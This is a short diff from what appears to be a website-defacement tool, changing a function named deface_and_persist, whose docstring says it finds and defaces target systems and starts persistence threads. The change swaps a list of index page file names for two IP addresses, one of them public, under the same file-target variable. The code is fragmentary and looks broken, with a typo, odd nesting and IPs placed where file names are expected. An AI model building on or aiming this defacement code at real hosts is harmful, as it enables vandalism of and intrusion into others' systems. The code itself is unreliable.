@@ -31,8 +31,7 @@ def found_roots():
 def deface_and_persist(root_path, payload):
     """Recursively finds and defaces target systems, then launches persistence
 threads."""
-index_files_to_target = ["index.html", "index.php", "index.htm", "home.htnl",
-"default.html", "main.html", "index.asp", "index.jsp"]
+index_files_to_target = ["192.168.1.10", "103.190.171.135"]
 defaced_targets = []
 
 def root_path():
